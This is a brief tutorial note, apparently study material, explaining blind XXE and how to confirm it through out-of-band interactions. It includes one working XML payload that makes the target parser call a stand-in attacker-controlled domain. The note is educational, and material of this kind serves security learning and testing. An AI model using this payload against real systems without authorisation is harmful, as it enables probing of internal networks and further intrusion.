# Detecting blind XXE using out-of-band (OAST) techniques

**Blind XXE Vulnerabilities**

**What is Blind XXE?**

- The application processes XXE payloads but **does not return** external entity content in its responses.
- Direct file retrieval via response is **not possible**.
- More challenging to detect and exploit than regular XXE.

---

**Detection Using Out-of-Band (OAST) Techniques**

**Method:** Trigger an out-of-band network interaction to confirm XXE.

**Example Payload:**

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "<http://attacker-controlled-domain.com>">
]>
<data>&xxe;</data>
```

**How it Works:**

1. The XML parser attempts to load the external entity.
2. The server makes an HTTP request to your domain.
3. Monitor your server logs for:
    - DNS lookup
    - HTTP request received

**Result:**

- If you see the request, XXE is present.
- This confirms the parser processes external entities.

---

**Key Points:**

- **No data returned** in application response ≠ no vulnerability.
- Out-of-band detection is often the **first step** in confirming blind XXE.
- Useful for probing internal network accessibility and firewall rules.